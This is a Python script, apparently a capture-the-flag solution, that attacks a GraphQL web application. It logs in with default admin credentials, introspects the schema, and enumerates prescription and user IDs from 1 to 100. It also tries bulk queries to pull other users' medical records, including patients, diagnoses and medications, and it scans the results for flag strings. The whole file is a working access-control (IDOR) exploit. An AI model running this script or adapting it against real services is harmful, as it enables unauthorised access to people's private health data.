import requests
import json
import re

# ============ 配置区域 ============
BASE_URL = "http://localhost:3000"  # 修改为目标地址
GRAPHQL_ENDPOINT = f"{BASE_URL}/graphql"
LOGIN_URL = f"{BASE_URL}/login"
USERNAME = "admin"  # 修改为有效用户名
PASSWORD = "admin"  # 修改为有效密码
ID_RANGE_START = 1
ID_RANGE_END = 100
# ================================

def create_session():
    """创建并配置带cookie的session"""
    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    return session

def try_login(session):
    """尝试登录获取cookie"""
    login_data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    try:
        resp = session.post(LOGIN_URL, json=login_data, allow_redirects=False)
        print(f"[*] Login status: {resp.status_code}")
        if resp.status_code in [200, 302]:
            print("[+] Login successful or redirected")
        print(f"[*] Cookies: {dict(session.cookies)}")
    except Exception as e:
        print(f"[!] Login error: {e}")

def fetch_page_js(session):
    """获取页面源码，分析JS中的GraphQL查询结构"""
    try:
        resp = session.get(BASE_URL)
        page_source = resp.text
        
        # 提取所有script标签内容
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', page_source, re.DOTALL)
        for i, script in enumerate(scripts):
            if 'graphql' in script.lower() or 'query' in script.lower() or 'prescription' in script.lower():
                print(f"\n[+] Found relevant script block #{i}:")
                print(script[:2000])
                
        # 提取GraphQL相关URL
        graphql_urls = re.findall(r'["\'](/[^"\']*graphql[^"\']*)["\']', page_source, re.IGNORECASE)
        if graphql_urls:
            print(f"\n[+] Found GraphQL URLs: {graphql_urls}")
            
        # 提取userID相关定义
        userid_patterns = re.findall(r'userId["\s:=]+["\']?(\w+)["\']?', page_source, re.IGNORECASE)
        if userid_patterns:
            print(f"[+] Found userId references: {userid_patterns}")
            
        return page_source
    except Exception as e:
        print(f"[!] Error fetching page: {e}")
        return ""

def introspect_schema(session):
    """GraphQL内省查询，获取schema信息"""
    introspection_query = {
        "query": """
        {
            __schema {
                types {
                    name
                    fields {
                        name
                        args {
                            name
                            type { name }
                        }
                    }
                }
            }
        }
        """
    }
    try:
        resp = session.post(GRAPHQL_ENDPOINT, json=introspection_query)
        if resp.status_code == 200:
            data = resp.json()
            print("\n[+] GraphQL Schema Introspection:")
            if "data" in data and "__schema" in data["data"]:
                for t in data["data"]["__schema"]["types"]:
                    if not t["name"].startswith("__"):
                        fields = [f["name"] for f in (t["fields"] or [])]
                        if fields:
                            print(f"  Type: {t['name']} -> Fields: {fields}")
            return data
    except Exception as e:
        print(f"[!] Introspection error: {e}")
    return None

def query_prescription_by_id(session, prescription_id):
    """通过ID查询处方 - 尝试多种查询格式"""
    queries = [
        # 格式1: 直接ID查询
        {
            "query": '{ prescription(id: "%s") { id doctor patient date diagnosis medications } }' % prescription_id
        },
        # 格式2: 整数ID
        {
            "query": '{ prescription(id: %d) { id doctor patient date diagnosis medications } }' % prescription_id
        },
        # 格式3: prescriptionId参数
        {
            "query": '{ prescription(prescriptionId: %d) { id doctor patient date diagnosis medications } }' % prescription_id
        },
        # 格式4: 查询query操作
        {
            "query": 'query { prescription(id: "%s") { id doctor patient date diagnosis medications } }' % prescription_id
        },
    ]
    
    for i, q in enumerate(queries):
        try:
            resp = session.post(GRAPHQL_ENDPOINT, json=q)
            if resp.status_code == 200:
                data = resp.json()
                if "errors" not in data and data.get("data", {}).get("prescription"):
                    return data["data"]["prescription"], i
        except:
            continue
    return None, -1

def query_prescriptions_by_userid(session, user_id):
    """通过userID查询处方列表"""
    queries = [
        {
            "query": '{ prescriptions(userId: %d) { id doctor patient date diagnosis medications } }' % user_id
        },
        {
            "query": '{ prescriptions(userId: "%s") { id doctor patient date diagnosis medications } }' % str(user_id)
        },
        {
            "query": '{ user(id: %d) { prescriptions { id doctor patient date diagnosis medications } } }' % user_id
        },
        {
            "query": 'query GetPrescriptions($userId: Int!) { prescriptions(userId: $userId) { id doctor patient date diagnosis medications } }',
            "variables": {"userId": user_id}
        },
        {
            "query": 'query { prescriptions(userId: %d) { edges { node { id doctor patient date diagnosis medications } } } }' % user_id
        },
    ]
    
    for i, q in enumerate(queries):
        try:
            resp = session.post(GRAPHQL_ENDPOINT, json=q)
            if resp.status_code == 200:
                data = resp.json()
                if "errors" not in data:
                    prescriptions = data.get("data", {}).get("prescriptions") or data.get("data", {}).get("user", {}).get("prescriptions")
                    if prescriptions:
                        return prescriptions, i
        except:
            continue
    return None, -1

def extract_flag(text):
    """从文本中提取flag"""
    flag_patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'[a-f0-9]{32}',  # MD5格式flag
    ]
    found = []
    for pattern in flag_patterns:
        matches = re.findall(pattern, str(text), re.IGNORECASE)
        found.extend(matches)
    return found

def main():
    session = create_session()
    
    # Step 1: 登录获取cookie
    print("[*] Step 1: Logging in...")
    try_login(session)
    
    # Step 2: 获取页面JS分析GraphQL结构
    print("\n[*] Step 2: Analyzing page JavaScript...")
    page_source = fetch_page_js(session)
    
    # Step 3: GraphQL内省查询
    print("\n[*] Step 3: Performing GraphQL introspection...")
    schema = introspect_schema(session)
    
    # Step 4: 遍历prescription ID
    print(f"\n[*] Step 4: Enumerating prescriptions (ID {ID_RANGE_START}-{ID_RANGE_END})...")
    found_prescriptions = []
    successful_query_format = None
    
    for pid in range(ID_RANGE_START, ID_RANGE_END + 1):
        result, fmt = query_prescription_by_id(session, pid)
        if result:
            if successful_query_format is None:
                successful_query_format = fmt
                print(f"[+] Successful query format: format #{fmt}")
            print(f"[+] Found prescription ID={pid}: {json.dumps(result, indent=2)}")
            found_prescriptions.append(result)
            
            # 检查flag
            flags = extract_flag(result)
            if flags:
                print(f"\n{'='*50}")
                print(f"[!!!] FLAG FOUND: {flags}")
                print(f"{'='*50}\n")
    
    # Step 5: 遍历userID查询处方
    print(f"\n[*] Step 5: Enumerating prescriptions by userID ({ID_RANGE_START}-{ID_RANGE_END})...")
    for uid in range(ID_RANGE_START, ID_RANGE_END + 1):
        results, fmt = query_prescriptions_by_userid(session, uid)
        if results:
            print(f"[+] Found prescriptions for userID={uid}:")
            for rx in results:
                print(f"    {json.dumps(rx, indent=2)}")
                found_prescriptions.append(rx)
                
                flags = extract_flag(rx)
                if flags:
                    print(f"\n{'='*50}")
                    print(f"[!!!] FLAG FOUND: {flags}")
                    print(f"{'='*50}\n")
    
    # Step 6: 尝试直接查询所有处方
    print("\n[*] Step 6: Trying to list all prescriptions...")
    bulk_queries = [
        {"query": "{ prescriptions { id doctor patient date diagnosis medications } }"},
        {"query": "{ allPrescriptions { id doctor patient date diagnosis medications } }"},
        {"query": "{ listPrescriptions { id doctor patient date diagnosis medications } }"},
    ]
    for q in bulk_queries:
        try:
            resp = session.post(GRAPHQL_ENDPOINT, json=q)
            if resp.status_code == 200:
                data = resp.json()
                if "errors" not in data and data.get("data"):
                    print(f"[+] Bulk query succeeded: {json.dumps(data['data'], indent=2)}")
                    flags = extract_flag(data)
                    if flags:
                        print(f"\n{'='*50}")
                        print(f"[!!!] FLAG FOUND: {flags}")
                        print(f"{'='*50}\n")
                    break
        except:
            continue
    
    # 汇总
    print(f"\n[*] Total prescriptions found: {len(found_prescriptions)}")
    all_text = json.dumps(found_prescriptions)
    all_flags = extract_flag(all_text)
    if all_flags:
        print(f"\n[!!!] ALL FLAGS: {all_flags}")
    else:
        print("[*] No flags found in standard patterns, dumping all data for manual review:")
        print(all_text[:5000])

if __name__ == "__main__":
    main()